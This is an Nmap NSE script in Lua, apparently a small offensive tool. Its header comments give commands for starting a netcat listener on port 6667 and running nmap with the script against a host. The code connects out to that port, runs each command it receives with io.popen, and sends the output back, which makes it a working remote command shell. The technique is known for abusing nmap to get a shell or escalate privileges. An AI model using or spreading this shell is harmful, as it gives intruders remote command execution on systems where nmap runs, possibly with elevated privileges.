-----------------------------------
-- Nmap version 6.40
-- Compiled with: nmap-liblua-5.2.2
-- csh 7/13/2020
-----------------------------------
-- TODO:
--   Edit portrule so we don't have to include -p<port> argument
--   ie: port 80 (or -p<port>) must be open before nmap executes
--   `action` section
--
-- [server]# nc -vl 6667
-- [client]$ nmap -Pn -p80 --script=/tmp/rshell.nse HOST
--
-----------
local shortport = require "shortport"
portrule = shortport.http
action = function(host, port)
  s = nmap.new_socket()
  s:connect(host, 6667, "tcp")
  while true do
     local x, cmd = s:receive()
     if cmd == "EOF" then
       break
     end
     local f = io.popen(cmd, "r")
     local r = f:read("*a")
     s:send(r)
     f:close()
  end
end
